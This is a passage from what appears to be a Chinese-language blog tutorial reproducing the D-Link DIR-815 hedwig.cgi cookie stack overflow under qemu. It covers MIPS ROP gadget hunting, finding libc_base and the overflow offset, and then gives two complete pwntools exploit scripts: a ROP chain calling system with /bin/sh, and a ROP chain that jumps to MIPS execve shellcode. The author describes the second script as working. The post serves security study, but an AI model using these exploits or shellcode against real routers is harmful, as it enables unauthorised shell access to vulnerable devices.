+<p>在<code>MIPS</code>架构中，我们通常都是在栈溢出的同时将<code>shellcode</code>读到栈上，然后再跳转过去执行，但是我们得知道<code>shellcode</code>在栈上的地址才行，这里可以用如<code>addiu $s0, $sp, ...</code>的<code>gadget</code>来得到栈上<code>shellcode</code>的地址，然后再找到一个<code>move $t9, $s0 ; jalr $t9</code>的<code>gadget</code>跳转过去。</p>
+<p>可以<strong>用<code>mipsrop.stackfinder()</code>找到</strong>类似于<code>addiu $..., $sp, ...</code>的<code>gadget</code>：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_N4ZD78EHFYFGSXZ.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="构造systemcmd的常用gadget">构造system(cmd)的常用gadget<a hidden class="anchor" aria-hidden="true" href="#构造systemcmd的常用gadget">#</a></h4>
+<p>如果这里我们想注入任意的<code>cmd</code>命令（比如反弹<code>shell</code>的命令），最简单的就是在栈溢出的同时将其写入栈上，那在我们调用<code>system</code>命令的时候，其第一个参数<code>$a0</code>就要是我们<code>cmd</code>命令的地址。</p>
+<p>我们想要一个<code>addiu $a0, $sp, ...</code>的<code>gadget</code>，但是这样的<code>gadget</code>一般来说没有能满足我们要求的，之后的跳转大多都不太方便。</p>
+<p>于是，我们想到可以通过如<code>addiu $s0, $sp, ...</code>和<code>move $a0, $s0</code>的组合命令实现，而一些原本要跳到<code>mempcpy</code>函数的地方，由于<code>mempcpy</code>函数的特性，恰好会同时包含上面两个<code>gadget</code>，也就不需要分两次跳转了，一段<code>gadget</code>就能搞定，例如：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_5UZ8YPRY8GFGV5B.png" style="max-width: 100%; height: auto;"></p>
+<p>这里由于上面所说的流水线指令集的特性，在跳转到<code>t9</code>之前，其第一个参数<code>$a0</code>就已经被赋为<code>$s2</code>了。</p>
+<h3 id="qemu复现">qemu复现<a hidden class="anchor" aria-hidden="true" href="#qemu复现">#</a></h3>
+<p>通过 qemu 模拟真机环境。</p>
+<p>首先，我们要尽可能模拟真机环境，所以需要在<code>var</code>下再创建一个<code>tmp</code>文件夹，这个在之前漏洞分析的时候已经说过了。</p>
+<p>这里的<code>ROP</code>链用上面所说的技巧构造就足够了，这里也就不一步步分析怎么找出<code>ROP</code>链来的了。</p>
+<p>此外，需要注意的是，<strong>这个路由设备的真机就是没有开地址随机化的</strong>，我们用<code>qemu</code>用户模式模拟的时候，本身就是不带地址随机化的，因此需要先<code>gdb</code>连上找一下<code>libc_base</code>，当然，至于栈溢出多少，直接看可能不好看出来，可以用<code>cyclic</code>测一下。</p>
+<h4 id="准备工作">准备工作<a hidden class="anchor" aria-hidden="true" href="#准备工作">#</a></h4>
+<p>首先，<code>cyclic 2000 &gt; payload</code>，将生成的<code>2000</code>个字符存放到<code>payload</code>文件中，再用以下<code>shell</code>脚本：</p>
+<pre tabindex="0"><code>#!/bin/bash
+ 
+INPUT=&#34;winmt=pwner&#34;
+LEN=$(echo -n &#34;$INPUT&#34; | wc -c)
+cookie=&#34;uid=`cat payload`&#34;
+ 
+echo $INPUT | qemu-mipsel -L ./ -0 &#34;hedwig.cgi&#34; -E REQUEST_METHOD=&#34;POST&#34; -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&#34;application/x-www-form-urlencoded&#34; -E HTTP_COOKIE=$cookie -E REQUEST_URI=&#34;2333&#34; -g 1234 ./htdocs/cgibin
+</code></pre><p>这里的<code>cat payload</code>，可以将<code>payload</code>文件中的内容读到<code>uid=</code>之后，然后<code>echo $INPUT |</code>可以做到<code>POST</code>的效果，<code>-0</code>就是<code>argv[0]</code>，<code>-E</code>就是设置的环境变量，<code>-g</code>是连上端口，这些我之前的文章中写过，就不多说了。</p>
+<p>用<code>multiarch-gdb</code>连上<code>1234</code>端口后，先来确定<code>libc_base</code>，由于<code>qemu</code>用户模式连上<code>pwndbg</code>时，<code>vmmap</code>是无法看到<code>libc_base</code>的，所以只能<strong>通过找一个<code>libc</code>函数地址减去偏移来得到<code>libc_base</code></strong>，这里有个小技巧，根据“延迟绑定”的特性，当一个函数在第二次及以后被调用的时候，就会直接跳转到其相应的<code>libc</code>地址，所以断点下在该函数再被调用时<code>jr $t9</code>跳转的位置会比较好：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_MBCVF98BR6PTYFF.png" style="max-width: 100%; height: auto;"></p>
+<p>然后就是找栈溢出的偏移了，我们跳转到<code>hedwigcgi_main</code>函数最后的<code>jr $ra</code>的位置，可以看到此时的跳转地址，再<strong>用<code>cyclic -l</code>查找一下</strong>，就得到偏移量了：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_3V5AT3GUE7R4X3H.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="纯rop链">纯ROP链<a hidden class="anchor" aria-hidden="true" href="#纯rop链">#</a></h4>
+<p>这里是<code>system</code>地址末两位是<code>\x00</code>，而<code>sprintf</code>会被<code>\x00</code>截断，因此这里采用的方法是：<strong>读进去<code>system_addr - 1</code>，再找到<code>addiu ..., 1</code>的<code>gadget</code>对其操作后再跳转过去</strong>。</p>
+<pre tabindex="0"><code>from pwn import *
+context(os = &#39;linux&#39;, arch = &#39;mips&#39;, log_level = &#39;debug&#39;)
+ 
+libc_base = 0x7F738000
+ 
+payload = b&#39;a&#39;*0x3cd
+payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1
+payload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=&gt; jalr $t9)
+payload += b&#39;a&#39;*4
+payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh
+payload += b&#39;a&#39;*(4*2)
+payload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=&gt; jalr $s1)
+payload += b&#39;a&#39;*(4*2)
+payload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=&gt; jalr $s6)
+ 
+payload = b&#34;uid=&#34; + payload
+post_content = &#34;winmt=pwner&#34;
+io = process(b&#34;&#34;&#34;
+    qemu-mipsel -L ./ \
+    -0 &#34;hedwig.cgi&#34; \
+    -E REQUEST_METHOD=&#34;POST&#34; \
+    -E CONTENT_LENGTH=11 \
+    -E CONTENT_TYPE=&#34;application/x-www-form-urlencoded&#34; \
+    -E HTTP_COOKIE=\&#34;&#34;&#34;&#34; + payload + b&#34;&#34;&#34;\&#34; \
+    -E REQUEST_URI=&#34;2333&#34; \
+    ./htdocs/cgibin
+&#34;&#34;&#34;, shell = True)
+io.send(post_content)
+io.interactive()
+</code></pre><p>这个脚本的<code>ROP</code>链构造没什么问题，<strong>但是在用户模式下是打不通的</strong>，原因是这里的<code>system</code>函数中有调用<code>fork()</code>函数，而用户模式是不支持多线程的，这里<code>fork()</code>的失败，会导致后面<code>$fp</code>是个空指针，就会出错，之后在系统模式打就不会出问题了。</p>
+<p>在<code>system</code>函数中：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_UXNE9CBD7SUUBV2.png" style="max-width: 100%; height: auto;"></p>
+<p>最后，会卡在这里：</p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202204/949925_GKKYA4SDQCK6TRY.png" style="max-width: 100%; height: auto;"></p>
+<h4 id="rop--shellcode">ROP + shellcode<a hidden class="anchor" aria-hidden="true" href="#rop--shellcode">#</a></h4>
+<p>这里需要注意<strong>让<code>shellcode</code>中不能存在<code>\x00</code>等坏字符</strong>，导致<code>sprintf</code>被截断。</p>
+<p>这个脚本肯定是可以成功打通的。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x7F738000</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x3cd</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x436D0</span><span class="p">)</span> <span class="c1"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x56BD0</span><span class="p">)</span> <span class="c1"># s3  sleep</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x57E50</span><span class="p">)</span> <span class="c1"># ra  li $a0, 1 (=&gt; jalr $s1)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x37E6C</span><span class="p">)</span> <span class="c1"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3B974</span><span class="p">)</span> <span class="c1"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    slti $a2, $zero, -1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    li $t7, 0x69622f2f
+</span></span></span><span class="line"><span class="cl"><span class="s1">    sw $t7, -12($sp)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    li $t6, 0x68732f6e
+</span></span></span><span class="line"><span class="cl"><span class="s1">    sw $t6, -8($sp)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    sw $zero, -4($sp)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    la $a0, -12($sp)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    slti $a1, $zero, -1
+</span></span></span><span class="line"><span class="cl"><span class="s1">    li $v0, 4011
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall 0x40404
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;uid=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">post_content</span> <span class="o">=</span> <span class="s2">&#34;winmt=pwner&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    qemu-mipsel -L ./ </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -0 &#34;hedwig.cgi&#34; </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -E REQUEST_METHOD=&#34;POST&#34; </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -E CONTENT_LENGTH=11 </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -E CONTENT_TYPE=&#34;application/x-www-form-urlencoded&#34; </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -E HTTP_COOKIE=</span><span class="se">\&#34;</span><span class="s2">&#34;&#34;&#34;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&#34;&#34;</span><span class="se">\&#34;</span><span class="s2"> </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    -E REQUEST_URI=&#34;2333&#34; </span><span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="s2">    ./htdocs/cgibin
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">,</span> <span class="n">shell</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">post_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/13294?time__1311=GqmxuD0DnDyAeGNeeequGEDknWwbxAI3x">MIPS PWN学习 - 先知社区</a></p>
+<p>[<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_0">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<p><a href="https://zikh26.github.io/posts/919c29c4.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">IOT安全入门学习&ndash;MIPS汇编基础 | ZIKH26&rsquo;s Blog</a>
+<a href="https://www.anquanke.com/post/id/202965#h2-5">MIPS 指令集 Shellcode 编写入门-安全客 - 安全资讯平台</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
